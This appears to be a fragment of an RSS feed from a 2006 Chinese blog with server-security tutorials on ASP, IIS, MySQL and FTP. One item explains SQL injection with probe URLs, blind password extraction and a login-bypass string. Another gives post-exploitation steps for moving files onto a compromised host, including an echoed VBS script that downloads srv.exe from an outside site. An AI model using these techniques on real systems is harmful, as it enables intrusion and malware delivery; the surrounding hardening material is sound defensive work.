+      <guid>http://example.org/2006/02/25/aspe5ae89e585a8e9858de7bdaee4b88de5ae8ce585a8e6898be5868c/</guid>
+      <description>从asp程序编写到服务器配置 ASP全称Active Server Pages，是微软推出的用来取代CGI（Common Gateway Interface）的动态服务器网页技术。由于ASP比较简单易学，又有微软这个强大后台的支持，所以应用比较广泛，相对来说发现的缺陷和针对各程序的漏洞也比较多。ASP可运行的服务器端平台包括：WinNT、Win2k、WinXP和Win2003，在Win98环境下装上PWS4.0也可以运行。现在我们就针对Win2k和Win2003这两个系统来谈谈ASP的安全配置。
+ASP程序安全篇： 在做安全配置前，我们先了解一下入侵者的攻击手法。现在很流行注入攻击，所谓注入攻击，就是利用提交特殊地址将ASP中引用的正常SQL语句和入侵者所需要的SQL语句一并执行，使入侵者达到入侵的目的。现在更是有一些脚本注入工具发布，使菜鸟也可以轻松完成对ASP的注入攻击。那么我们先来了解一下这些工具是怎样注入的。 首先，入侵者会对一个网站确定可不可以进行注入，假设一篇文章的地址为： http://www.scccn.com/news.asp?id=1 一般会以提交两个地址来测试，如： http://www.scccn.com/news.asp?id=1 and 1=1 http://www.scccn.com/news.asp?id=1 and 1=2 第一个地址后面加了 and 1=1，构成的SQL语句也就变为了：Select * from 表单名 where id=1 and 1=1这句话要成立就必须and前后语句都成立。那么前面的文章地址是可以访问的，后面的1=1也是客观成立的，那么第一个地址就可以正常显示；相反1=2是显然不成立的，关键就看这步了，如果提交and 1=2页面还是正常显示说明他并没有将and 1=2写入SQL语句，此站也就不存在注入漏洞；但如果提交and 1=2之后返回了错误页面则说明此站点将后面的语句带入了SQL语句并执行了，也就说明他可以进行SQL注入。（注：如果地址后面跟的是news.asp?id=&amp;lsquo;1&amp;rsquo;就得变为news.asp?id=1&amp;rsquo; and &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1来补全引号了） 那么，知道可以注入后入侵者可以做什么呢？ 这里就简单的说一下，比如提交这样的地址： http://www.scccn.com/news.asp?id=1 and exists (select * from 表名 where 列名=数据) 根据返回的正确或错误页面来判断猜的表名和列名是否正确，具体实现时是先猜表名再猜列名。当猜出表名和列名之后还可以用ASC和MID函数来猜出各列的数据。MID函数的格式为：mid(变量名,第几个字符开始读取,读取几个字符)，比如：mid(pwd,1,2)就可以从变量pwd中的第一位开始读取两位的字符。ASC函数的格式为：ASC（&amp;ldquo;字符串&amp;rdquo;），如：asc(&amp;ldquo;a&amp;rdquo;)就可以读出字母a的ASCII码了。那么实际应用的时候就可以写为：asc(mid(pwd,1,1))这样读取的就是pwd列的第一个字符的ASCII码，提交： asc(mid(pwd,1,1))&amp;gt;97以返回的页面是否为正确页面来判断pwd列的第一个字符的ASCII码是否大于97（a的ASCII码），如果正确就再试是否小于122（z的ASCII码）……这样慢慢缩小字符的ASCII码的范围，猜到真实的ASCII码也只是时间的问题。一位一位的猜就可以得到数据库中的用户名和密码了。还有一种ASP验证缺陷——就是用户名和密码都输&amp;rsquo;or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1，构造SQL语句Select * form 表单名 where username=&amp;rsquo;&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo; and pwd=&amp;rsquo;&amp;rsquo; or &amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;就可以达到绕过密码验证的目的。 说了那么多，其实防范的方法很简单，我们把特殊字符（如and、or、&amp;rsquo;、&amp;quot;）都禁止提交就可以防止注入了。ASP传输数据分为get和post两种， get是通过将数据添加到URL后提交的方式，post则是利用邮寄信息数据字段将数据传送到服务器。 那么，我们先来看看如何将get方式提交数据中的特殊字符过滤。首先要知道，IIS是以字符串的形式将get请求传给asp.dll的，在将数据传递给Request.QueryString之后，asp解析器会解析出Request.QueryString的信息，然后跟据&amp;quot;&amp;amp;&amp;ldquo;来分出各个数组内的数据。现在我们要让get方式不能提交以下字符： &amp;lsquo;、and、exec、insert、select、delete、update、count、*、%、chr、mid、master、truncate、char、declare 那么，防止get方式注入的代码就如下：
+If Request.QueryString&amp;quot;&amp;quot; Then For Each SQL_Get In Request.QueryString For SQL_Data=0 To Ubound(sql_leach_0) if instr(Request.</description>
+    </item>
+    
+    <item>
+      <title>浅谈网络服务器安全维护技巧</title>
+      <link>http://example.org/2006/02/25/e6b585e8b088e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e7bbb4e68aa4e68a80e5b7a7/</link>
+      <pubDate>Sat, 25 Feb 2006 16:05:02 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e6b585e8b088e7bd91e7bb9ce69c8de58aa1e599a8e5ae89e585a8e7bbb4e68aa4e68a80e5b7a7/</guid>
+      <description>网络服务器的恶意网络行为包括两个方面：一是恶意的攻击行为，如拒绝服务攻击，网络病毒等等，这些行为旨在消耗服务器资源，影响服务器的正常运作，甚至服务器所在网络的瘫痪；另外一个就是恶意的入侵行为，这种行为更是会导致服务器敏感信息泄露，入侵者更是可以为所欲为，肆意破坏服务器。所以我们要保证网络服务器的安全可以说就是尽量减少网络服务器受这两种行为的影响。
+基于windows做操作系统的服务器在中国市场的份额以及国人对该操作系统的了解程度，我在这里谈谈个人对维护windows网络服务器安全的一些个人意见。
+如何避免网络服务器受网上那些恶意的攻击行为：
+(一) 构建好你的硬件安全防御系统
+选用一套好的安全系统模型。一套完善的安全模型应该包括以下一些必要的组件：防火墙、入侵检测系统、路由系统等。
+防火墙在安全系统中扮演一个保安的角色，可以很大程度上保证来自网络的非法访问以及数据流量攻击，如拒绝服务攻击等；入侵检测系统则是扮演一个监视器的角色，监视你的服务器出入口，非常智能地过滤掉那些带有入侵和攻击性质的访问。
+(二) 选用英文的操作系统
+要知道，windows毕竟美国微软的东西，而微软的东西一向都是以Bug 和 Patch多而著称，中文版的Bug远远要比英文版多，而中文版的补丁向来是比英文版出的晚，也就是说，如果你的服务器上装的是中文版的windows系统，微软漏洞公布之后你还需要等上一段时间才能打好补丁，也许黑客、病毒就利用这段时间入侵了你的系统。
+如何防止网络服务器不被黑客入侵：
+首先，作为一个黑客崇拜者，我想说一句，世界上没有绝对安全的系统。我们只可以尽量避免被入侵，最大的程度上减少伤亡。
+(一) 采用NTFS文件系统格式
+大家都知道，我们通常采用的文件系统是FAT或者FAT32，NTFS是微软Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式。NTFS文件系统里你可以为任何一个磁盘分区单独设置访问权限。把你自己的敏感信息和服务信息分别放在不同的磁盘分区。这样即使黑客通过某些方法获得你的服务文件所在磁盘分区的访问权限，还需要想方设法突破系统的安全设置才能进一步访问到保存在其他磁盘上的敏感信息。
+(二)做好系统备份
+常言道，“有备无患”，虽然谁都不希望系统突然遭到破坏，但是不怕一万，就怕万一，作好服务器系统备份，万一遭破坏的时候也可以及时恢复。
+(三)关闭不必要的服务，只开该开的端口
+关闭那些不必要开的服务，做好本地管理和组管理。Windows系统有很多默认的服务其实没必要开的，甚至可以说是危险的，比如：默认的共享远程注册表访问(Remote Registry Service)，系统很多敏感的信息都是写在注册表里的，如pcanywhere的加密密码等。
+关闭那些不必要的端口。一些看似不必要的端口，确可以向黑客透露许多操作系统的敏感信息，如windows 2000 server 默认开启的IIS服务就告诉对方你的操作系统是windows 2000。69端口告诉黑客你的操作系统极有可能是linux或者unix系统，因为69是这些操作系统下默认的tftp服务使用的端口。对端口的进一步访问，还可以返回该服务器上软件及其版本的一些信息，这些对黑客的入侵都提供了很大的帮助。此外，开启的端口更有可能成为黑客进入服务器的门户。
+总之，做好TCP/IP端口过滤不但有助于防止黑客入侵，而且对防止病毒也有一定的帮助。
+(四)软件防火墙、杀毒软件
+虽然我们已经有了一套硬件的防御系统，但是“保镖”多几个也不是坏事。
+(五)开启你的事件日志
+虽然开启日志服务虽然说对阻止黑客的入侵并没有直接的作用，但是通过他记录黑客的行踪，我们可以分析入侵者在我们的系统上到底做过什么手脚，给我们的系统到底造成了哪些破坏及隐患，黑客到底在我们的系统上留了什么样的后门，我们的服务器到底还存在哪些安全漏洞等等。如果你是高手的话，你还可以设置密罐，等待黑客来入侵，在他入侵的时候把他逮个正着。</description>
+    </item>
+    
+    <item>
+      <title>八种文件上传大法</title>
+      <link>http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/</link>
+      <pubDate>Sat, 25 Feb 2006 16:03:17 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e585abe7a78de69687e4bbb6e4b88ae4bca0e5a4a7e6b395/</guid>
+      <description>八种文件上传大法 本文是居于已经得到了一个有一定权限的SHELL.命令行下传送文件的其他方法. 一，TFTP
+格式：tftp -i get file.exe path/file.exe 默认存放在system32下，如果指定就存在指定的地方。
+二：ftp下载文件
+ftp下载文件一般步骤如下：
+echo open xxx.xxx.xxx.xxx &amp;gt;ftp.txt
+echo user &amp;raquo;ftp.txt
+echo password &amp;raquo;ftp.txt
+echo binary &amp;raquo;ftp.txt [可选]
+echo get srv.exe &amp;raquo;ftp.txt
+echo bye &amp;raquo;ftp.txt
+ftp -s:ftp.txt(这一步是关键哟)
+del ftp.txt
+这样srv.exe文件就下在下来了。保证srv.exe已经存在指定位置。
+四：写程序下载
+脚本是非常好的东西，只要把源码保存到一个文件中就能运行。所以在shell下，用echo语句直接写到一个文件中，在用相应的解释程序执行就可以啦。这里是一个程序实例的简化:
+echo Set xPost = CreateObject(&amp;ldquo;Microsoft.XMLHTTP&amp;rdquo;) &amp;gt;webdown.vbs
+echo xPost.Open &amp;ldquo;GET&amp;rdquo;,&amp;ldquo;http://txhak.126.com/srv.exe&amp;quot;,0 &amp;raquo;webdown.vbs
+echo xPost.Send() &amp;raquo;webdown.vbs
+echo Set sGet = CreateObject(&amp;ldquo;ADODB.Stream&amp;rdquo;) &amp;raquo;webdown.vbs
+echo sGet.Mode = 3 &amp;raquo;webdown.vbs
+echo sGet.Type = 1 &amp;raquo;webdown.vbs
+echo sGet.Open() &amp;raquo;webdown.</description>
+    </item>
+    
+    <item>
+      <title>让IIS支持多种脚本</title>
+      <link>http://example.org/2006/02/25/e8aea9iise694afe68c81e5a49ae7a78de8849ae69cac/</link>
+      <pubDate>Sat, 25 Feb 2006 13:36:41 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e8aea9iise694afe68c81e5a49ae7a78de8849ae69cac/</guid>
+      <description>在网上看了很多文章，但支持jsp的，试了Ｎ次都没成功，今天看到&amp;quot;孤独&amp;quot;的&amp;quot;jsp连接sql server 2000数据库的配置&amp;quot;，受到启发，自己小试了一会，果然成功。但俺用的操作系统是win2k-p的，都可以用，目前俺的ＩＩＳ已支持：ASP、ASP.NET、PHP、JSP、Perl，爽！！现将简单的说一下： 一、支持ASP 支持ASP的话，在IIS下直接设置一下就行的，不用另装软件。
+二、支持ASP.NET 下载微软的Microsoft .NET Framework，直接安装。
+三、支持PHP 下载PHP For IIS的软件，安装后，在IIS中添加&amp;quot;应用程序映射&amp;quot;中的扩展名关连。
+四、支持JSP 1.先安装J2SDK(j2sdk-1_4_2-windows-i586.exe,下载地址)
+2.配置J2SDK环境变量 JAVA_HOME=C:\j2sdk1.4.2 CLASSPATH=C:\j2sdk1.4.2\bin;.;C:\j2sdk1.4.2\lib;C:\j2sdk1.4.2\lib\dt.jar;C:\j2sdk1.4.2\lib\tools.jar 增加PATH=C:\j2sdk1.4.2;C:\j2sdk1.4.2\bin 配置完成后重启计算机
+3.测试安装和配置是否正常 public class test{ public static void main(String args[]){ System.out.println(&amp;ldquo;This is a test program.&amp;rdquo;); } } 将以上代码保存为test.java,然后在命令提示符下输入javac test.java;java test
+4.安装Tomact(jakarta-tomcat-4.1.30.exe,下载地址)
+5.配置Tomact环境变量 CATALINA_HOME=C:\Program Files\Apache Group\Tomcat 4.1 增加CLASSPATH=C:\Program Files\Apache Group\Tomcat 4.1\common\lib\servlet.jar 配置完成后重启计算机
+6.测试JSP是否正常 启动Tomact，然后在IE中输入http://locahost:8080/ ，如果网页能正常显示就说明ＯＫ了。
+五、支持Perl 下载Perl For IIS，然后安装。
+这样你的IIS就能支持Ｎ多脚本了，对于学习和测试都有很大的帮忙。上面所需的软件基本都有下载地址。本人的测试环境：Intel815EPT+CIII-1.1G+HardDisk 20G+SD 256M+Win2k-P(SP4)</description>
+    </item>
+    
+    <item>
+      <title>经验共享：服务器安全的三大纪律</title>
+      <link>http://example.org/2006/02/25/e7bb8fe9aa8ce585b1e4baabefbc9ae69c8de58aa1e599a8e5ae89e585a8e79a84e4b889e5a4a7e7baaae5be8b/</link>
+      <pubDate>Sat, 25 Feb 2006 13:28:09 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e7bb8fe9aa8ce585b1e4baabefbc9ae69c8de58aa1e599a8e5ae89e585a8e79a84e4b889e5a4a7e7baaae5be8b/</guid>
+      <description>电子商务的兴起，使的很多中小企业都拥有了自己的服务器。对内用来建立局域网，提升办公效率;对外建立网站，更为广泛地宣传企业产品和形象，争取更多客源。但是作为网络的核心产品，服务器技术相对复杂，尤其是在病毒肆虐的网络时代，安全问题显得更加突出。笔者在公司管理服务器并检查其安全性已经有段时间了，在实际工作中积累了一些经验，希望能和大家共享。 一、增强网络整体安全
+很多网管往往在维护网络安全方面存在这样的误区，认为只要将服务器单机打好补丁，安装好防护墙、操作系统定期升级就可以安枕无忧了。可实际上，很多黑客和病毒并非直接攻击服务器，而是通过入侵其他计算机作为跳板来攻击整个网络的。目前很多网络都是通过域的方式来管理，一旦黑客或病毒成功入侵与服务器有信任关系的一台计算机，那么从这台计算机攻击服务器将会变得非常简单。所以要办证整个网络的安全要从根本来考虑。
+首先是安全管理，要从管理角度出发，利用规章制度等文字性的材料规范，约束各种针对计算机网络的行为，例如禁止员工随便下载非法程序，禁止网络管理员以外的人员进入中心机房，完善网络管理员的值班制度等等。
+其次是安全技术，要从技术角度出发，利用各种软件和硬件，各种技巧和方法来管理整个计算机网络，杀毒软件与防火墙双管齐下力保网络的安全。
+这两方面缺一不可，试想如果只有安全技术的支持而在规章制度上没有进行任何约束，即使刚开始安全做的很到位，但员工随意下载非法软件，随便关闭杀毒软件的保护的话，整个网络安全形同虚设。而只有严格的规章没有技术作为支持的话病毒和黑客也会通过网络漏洞轻松入侵。因此安全管理与安全技术两方面相辅相成，网络管理员对于这两方面都要抓，力度都要硬。
+二、加强服务器本地文件格式安全级别
+目前服务器都采用的是windows2000以上版本，所以在加强安全级别上需要利用windows2000server提供的用户权限功能，根据每个用户的特点单独地为其制定访问服务器的特殊使用权限，从而避免因使用统一的访问服务器权限而带来的安全隐患。
+为了确保服务器的安全首先要在本地文件格式上做文章，即将FAT格式转换为安全系数更高的NTFS文件格式。毕竟对于黑客来说存储在FAT格式的磁盘分区里的数据要比存储在NTFS格式的磁盘分区的数据更容易访问，也更容易破坏，另外目前所有安全软件及加密软件也都是针对NTFS格式来说的，对FAT格式的保护非常薄弱。
+另外最好使用专门的网络检测软件对整个网络的运行情况进行7*24小时的不间断监视，尤其要关注“非法入侵”和“对服务器的操作”两方面的报告，笔者做在的公司就使用IISLOCK来监视网页服务器的正常运行和MRTG来检测整个网络的流量。
+三、定期备份数据
+数据的保护是一个非常重要的问题，也许服务器的系统没有崩溃但里面存储的数据发生了丢失，这种情况所造成的损失会更大，特别对于数据库服务器来说也许存储的是几年的珍贵数据。怎么才能有效的保护数据?备份是唯一的选择。以往对于数据的备份都是采取在服务器上另外一个区建立备份文件夹甚至是建立一个备份区。不过这样备份方法有一个非常大的弊端，那就是一旦服务器的硬盘出现问题所有分区的数据都将丢失，从而备份没有了保证。按照“不要把所有鸡蛋放到同一个篮子”的理论我们应该使用单独的专门设备保存这些珍贵数据。
+使用B服务器保存A服务器的数据，同时用A服务器保存B服务器的文件，这种交叉备份的方法在一段时间非常流行。另外还有一个有效的方法就是使用磁带来保存珍贵数据，不过这样的投资会比较大。
+目前笔者所在公司所采用的备份方式是通过网络存储设备NAS来保存的，将单独的NAS设备连接到网络中，定期通过工具将珍贵数据写入到NAS的硬盘中，由于NAS设备自身使用了RAID方式进行数据的冗余，所以数据得到了最好的保证。
+但是数据备份也存在巨大的安全漏洞，因为备份好的数据也有可能被盗窃，所以在备份时应该对备份介质进行有效的密码保护，必要时还需要使用加密软件对这些数据进行加密，这样即使数据被盗也不会出现数据泄露的问题。</description>
+    </item>
+    
+    <item>
+      <title>ASP木马Webshell安全解决办案</title>
+      <link>http://example.org/2006/02/25/aspe69ca8e9a9acwebshelle5ae89e585a8e8a7a3e586b3e58a9ee6a188/</link>
+      <pubDate>Sat, 25 Feb 2006 13:24:40 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/aspe69ca8e9a9acwebshelle5ae89e585a8e8a7a3e586b3e58a9ee6a188/</guid>
+      <description>ASP木马、Webshell之安全防范解决办法正文内容：
+注意：本文所讲述之设置方法与环境：适用于Microsoft Windows 2000 Server/Win2003 SERVER IIS5.0/IIS6.0 1、首先我们来看看一般ASP木马、Webshell所利用的ASP组件有那些？我们以海洋木马为列：
+＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;ws&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;ws&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;net&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:093FF999-1EA0-4079-9525-9614C3504B74&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;net&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:F935DC26-1CF0-11D0-ADB9-00C04FD58A0B&amp;quot;＞ ＜/object＞ ＜object runat=&amp;quot;server&amp;quot; id=&amp;quot;fso&amp;quot; scope=&amp;quot;page&amp;quot; classid=&amp;quot;clsid:0D43FE01-F093-11CF-8940-00A0C9054228&amp;quot;＞ ＜/object＞ shellStr=&amp;quot;Shell&amp;quot; applicationStr=&amp;quot;Application&amp;quot; if cmdPath=&amp;quot;wscriptShell&amp;quot; set sa=server.createObject(shellStr&amp;amp;&amp;quot;.&amp;quot;&amp;amp;applicationStr;) set streamT=server.createObject(&amp;quot;adodb.stream&amp;quot;) set domainObject = GetObject(&amp;quot;WinNT://.&amp;quot;) 以上是海洋中的相关代码，从上面的代码我们不难看出一般ASP木马、Webshell主要利用了以下几类ASP组件： ① WScript.Shell (classid:72C24DD5-D70A-438B-8A42-98424B88AFB8) ② WScript.Shell.1 (classid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B) ③ WScript.Network (classid:093FF999-1EA0-4079-9525-9614C3504B74) ④ WScript.Network.1 (classid:093FF999-1EA0-4079-9525-9614C3504B74) ⑤ FileSystem Object (classid:0D43FE01-F093-11CF-8940-00A0C9054228) ⑥ Adodb.stream (classid:{00000566-0000-0010-8000-00AA006D2EA4}) ⑦ Shell.</description>
+    </item>
+    
+    <item>
+      <title>用SQL建立MySQL用户和相应权限的方法</title>
+      <link>http://example.org/2006/02/25/e794a8sqle5bbbae7ab8bmysqle794a8e688b7e5928ce79bb8e5ba94e69d83e99990e79a84e696b9e6b395/</link>
+      <pubDate>Sat, 25 Feb 2006 13:22:58 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/e794a8sqle5bbbae7ab8bmysqle794a8e688b7e5928ce79bb8e5ba94e69d83e99990e79a84e696b9e6b395/</guid>
+      <description>好像phpMyADMIN还没有这个功能,但可以用phpMyAdmin通过输入语句的方法建立用户,或者一般的图形界面的SQL管理程序也可以建立和编辑用户. 这里只说使用GRANT语句的方法,当然还有直接修改MySQL表的方法,不过很麻烦,用的人不多~ 前提是有MySQL root权限 例子:建立另一个超级用户(所有权限)的方法 GRANT ALL ON . TO username@localhost IDENTIFIED BY &amp;lsquo;password&amp;rsquo; WITH GRANT OPTION
+localhost是主机名,也可以是IP,用于限定这个用户是否可以远程连接.还可以用通配符&amp;quot;%&amp;quot;,比如%.im286.com,或者202.97.224.% WITH GRANT OPTION用于指定该用户可以使用GRANT语句将权限授予别人/没有这个选项就不可以 . 中第一个星星是数据库名(*为所有数据库),第二个星星是表名(*为前面数据库下的所有表) ALL 是指全部语句的操作权限(经常看到虚拟主机等的用户没有DROP权限,就是这里做了手脚)
+语法大概就是这样吧.
+例子:建立一个只能可以操作数据库im286的账号im286并可以远程连接,但不能使用GRANT. GRANT ALL ON im286.* TO im286 IDENTIFIED BY &amp;lsquo;password&amp;rsquo; (这就是一般免费空间或虚拟主机上的用户数据库权限,但没有远程连接)
+例子:建立一个只能使用SELECT,INSERT,CREATE,DELETE,UPDATE语句的用户,不能远程连接 GRANT SELECT,INSERT,DELETE,UPDATE,CREATE ON dbname.* TO username@localhost IDENTIFIED BY &amp;lsquo;password&amp;rsquo;;
+已建立的用户,可以用REVOKE语句收回他的权限,然后用phpMyAdmin打开mysql-&amp;gt;user,找到那个用户名,点左边第二个的删除.用户就被完全删除了.
+另外上面的dbname 为数据库名 username 为用户名 password 为密码 不能用中文
+如果你直接修改相关user或priv表,可以看到的权限更多,比如关闭服务器的权限,线程控制权限,reset权限等(不说了,呵呵)
+运行这些语句的方法就是,在phpMyAdmin里,找一个可以贴代码的框,把代码贴进去运行就行了.当然也可以做个php小程序
+原理: mysql_connect(&amp;hellip;); mysql_select_db&amp;hellip;(); mysql_query(&amp;ldquo;GRANT &amp;hellip;.&amp;rdquo;);</description>
+    </item>
+    
+    <item>
+      <title>FTP服务器架设－－安全篇</title>
+      <link>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87-2/</link>
+      <pubDate>Sat, 25 Feb 2006 07:57:21 +0000</pubDate>
+      
+      <guid>http://example.org/2006/02/25/ftpe69c8de58aa1e599a8e69eb6e8aebeefbc8defbc8de5ae89e585a8e7af87-2/</guid>
+      <description>既然是公网ＦＴＰ服务器，就难免会遭遇一些恶意攻击，轻则丢失文件，重则造成ＦＴＰ服务器甚至整个系统崩溃。怎样才能最大限度地保证它的安全性呢？
+一、操作系统的选择
+ＦＴＰ服务器首先是基于操作系统而运作的，因而操作系统本身的安全性就决定了ＦＴＰ服务器安全性的级别。虽然Ｗｉｎｄｏ
+ｗｓ ９８／Ｍｅ一样可以架设ＦＴＰ服务器，但由于其本身的安全性就不强，易受攻击，因而最好不要采用。Ｗｉｎｄｏｗｓ ＮＴ就像鸡肋，不用也罢。最好采用Ｗｉｎｄｏｗｓ ２０００及以上版本，并记住及时打上补丁。至于Ｕｎｉｘ、Ｌｉｎｕｘ，则不在讨论之列。
+二、使用防火墙
+端口是计算机和外部网络相连的逻辑接口，也是计算机的第一道屏障，端口配置正确与否直接影响到主机的安全，一般来说，仅打开你需要使用的端口，将其他不需要使用的端口屏蔽掉会比较安全。限制端口的方法比较多，可以使用第三方的个人防火墙，如天网个人防火墙等，这里只介绍Ｗｉｎｄｏｗｓ自带的防火墙设置方法。
+１．利用ＴＣＰ／ＩＰ筛选功能
+在Ｗｉｎｄｏｗｓ ２０００和Ｗｉｎｄｏｗｓ ＸＰ中，系统都带有ＴＣＰ／ＩＰ筛选功能，利用它可以简单地进行端口设置。以Ｗｉｎｄｏｗｓ ＸＰ为例，打开“本地连接”的属性，在“常规”选项中找到“Ｉｎｔｅｒｎｅｔ协议（ＴＣＰ／ＩＰ）”，双击它打开该协议的属性设置窗口。点击右下方的“高级”按钮，进入“高级ＴＣＰ／ＩＰ设置”。在“选项”中选中“ＴＣＰ／ＩＰ筛选”并双击进入其属性设置。这里我们可以设置系统只允许开放的端口，假如架设的ＦＴＰ服务器端口为２１，先选中“启用ＴＣＰ／ＩＰ筛选（所有适配器）”，再在ＴＣＰ端口选项中选择“只允许”，点“添加”，输入端口号２１，确定即可。这样，系统就只允许打开２１端口。要开放其他端口，继续添加即可。这可以有效防止最常见的１３９端口入侵。缺点是功能过于简单，只能设置允许开放的端口，不能自定义要关闭的端口。如果你有大量端口要开放，就得一个个地去手工添加，比较麻烦。 ２．打开Ｉｎｔｅｒｎｅｔ连接防火墙
+对于Ｗｉｎｄｏｗｓ ＸＰ系统，自带了“Ｉｎｔｅｒｎｅｔ连接防火墙”功能，与ＴＣＰ／ＩＰ筛选功能相比，设置更方便，功能更强大。除了自带防火墙端口开放规则外，还可以自行增删。在控制面板中打开“网络连接”，右击拨号连接，进入“高级”选项卡，选中“通过限制或阻止来自Ｉｎｔｅｒｎｅｔ的对此计算机的访问来保护我的计算机和网络”，启用它。系统默认状态下是关闭了ＦＴＰ端口的，因而还要设置防火墙，打开所使用的ＦＴＰ端口。点击右下角的“设置”按钮进入“高级设置”，选中“ＦＴＰ服务器”，编辑它。由于ＦＴＰ服务默认端口是２１，因而除了ＩＰ地址一栏外，其余均不可更改。在ＩＰ地址一栏中填入服务器公网ＩＰ，确定后退出即可即时生效。如果架设的ＦＴＰ服务器端口为其他端口，比如２２，则可以在“服务”选项卡下方点“添加”，输入服务器名称和公网ＩＰ后，将外部端口号和内部端口号均填入２２即可。
+三、对ＩＩＳ、Ｓｅｒｖ－Ｕ等服务器软件进行设置
+除了依靠系统提供的安全措施外，就需要利用ＦＴＰ服务器端软件本身的设置来提高整个服务器的安全了。
+１．ＩＩＳ的安全性设置
+１）及时安装新补丁
+对于ＩＩＳ的安全性漏洞，可以说是“有口皆碑”了，平均每两三个月就要出一两个漏洞。所幸的是，微软会根据新发现的漏洞提供相应的补丁，这就需要你不断更新，安装最新补丁。
+２）将安装目录设置到非系统盘，关闭不需要的服务
+一些恶意用户可以通过ＩＩＳ的溢出漏洞获得对系统的访问权。把ＩＩＳ安放在系统分区上，会使系统文件与ＩＩＳ同样面临非法访问，容易使非法用户侵入系统分区。另外，由于ＩＩＳ是一个综合性服务组件，每开设一个服务都将会降低整个服务的安全性，因而，对不需要的服务尽量不要安装或启动。
+３）只允许匿名连接
+ＦＴＰ最大的安全漏洞在于其默认传输密码的过程是明文传送，很容易被人嗅探到。而ＩＩＳ又是基于Ｗｉｎｄｏｗｓ用户账户进行管理的，因而很容易泄漏系统账户名及密码，如果该账户拥有一定管理权限，则更会影响到整个系统的安全。设置为“只允许匿名连接”，可以免却传输过程中泄密的危险。进入“默认ＦＴＰ站点”，在属性的“安全账户”选项卡中，将此选项选中。
+４）谨慎设置主目录及其权限
+ＩＩＳ可以将ＦＴＰ站点主目录设为局域网中另一台计算机的共享目录，但在局域网中，共享目录很容易招致其他计算机感染的病毒攻击，严重时甚至会造成整个局域网瘫痪，不到万不得已，最好使用本地目录并将主目录设为ＮＴＦＳ格式的非系统分区中。这样，在对目录的权限设置时，可以对每个目录按不同组或用户来设置相应的权限。右击要设置的目录，进入“共享和安全→安全”中设置，如非必要，不要授予“写入”权限。 ５）尽量不要使用默认端口号２１
+启用日志记录，以备出现异常情况时查询原因。
+２．Ｓｅｒｖ－Ｕ的安全性设置
+与ＩＩＳ的ＦＴＰ服务相比，Ｓｅｒｖ－Ｕ在安全性方面做得比较好。
+１）对“本地服务器”进行设置
+首先。选中“拦截ＦＴＰ＿ｂｏｕｎｃｅ攻击和ＦＸＰ”。什么是ＦＸＰ呢？通常，当使用ＦＴＰ协议进行文件传输时，客户端首先向ＦＴＰ服务器发出一个“ＰＯＲＴ”命令，该命令中包含此用户的ＩＰ地址和将被用来进行数据传输的端口号，服务器收到后，利用命令所提供的用户地址信息建立与用户的连接。大多数情况下，上述过程不会出现任何问题，但当客户端是一名恶意用户时，可能会通过在ＰＯＲＴ命令中加入特定的地址信息，使ＦＴＰ服务器与其它非客户端的机器建立连接。虽然这名恶意用户可能本身无权直接访问某一特定机器，但是如果ＦＴＰ服务器有权访问该机器的话，那么恶意用户就可以通过ＦＴＰ服务器作为中介，仍然能够最终实现与目标服务器的连接。这就是ＦＸＰ，也称跨服务器攻击。选中后就可以防止发生此种情况。
+其次，在“高级”选项卡中，检查“加密密码”和“启用安全”是否被选中，如果没有，选择它们。“加密密码”使用单向ｈａｓｈ函数（ＭＤ５）加密用户口令，加密后的口令保存在ＳｅｒｖＵＤａｅｍｏｎ．ｉｎｉ或是注册表中。如果不选择此项，用户口令将以明文形式保存在文件中；“启用安全”将启动Ｓｅｒｖ－Ｕ服务器的安全成功。
+２）对域中的服务器进行设置
+前面说过，ＦＴＰ默认为明文传送密码，容易被人嗅探，对于只拥有一般权限的账户，危险并不大，但如果该账户拥有远程管理尤其是系统管理员权限，则整个服务器都会被别人远程控制。Ｓｅｒｖ－Ｕ对每个账户的密码都提供了以下三种安全类型：规则密码、ＯＴＰ Ｓ／ＫＥＹ ＭＤ４和ＯＴＰ Ｓ／ＫＥＹ ＭＤ５。不同的类型对传输的加密方式也不同，以规则密码安全性最低。进入拥有一定管理权限的账户的设置中，在“常规”选项卡的下方找到“密码类型”下拉列表框，选中第二或第三种类型，保存即可。注意，当用户凭此账户登录服务器时，需要ＦＴＰ客户端软件支持此密码类型，如ＣｕｔｅＦＴＰ Ｐｒｏ等，输入密码时选择相应的密码类型方可通过服务器验证。
+与ＩＩＳ一样，还要谨慎设置主目录及其权限，凡是没必要赋予写入等能修改服务器文件或目录权限的，尽量不要赋予。最后，进入“设置”，在“日志”选项卡中将“启用记录到文件”选中，并设置好日志文件名及保存路径、记录参数等，以方便随时查询服务器异常原因。
+好了，开通你的ＦＴＰ吧。告诉大家：你当站长了。</description>
+    </item>
+    
+    <item>
+      <title>配置 Windows Server 2003-IIS 6</title>
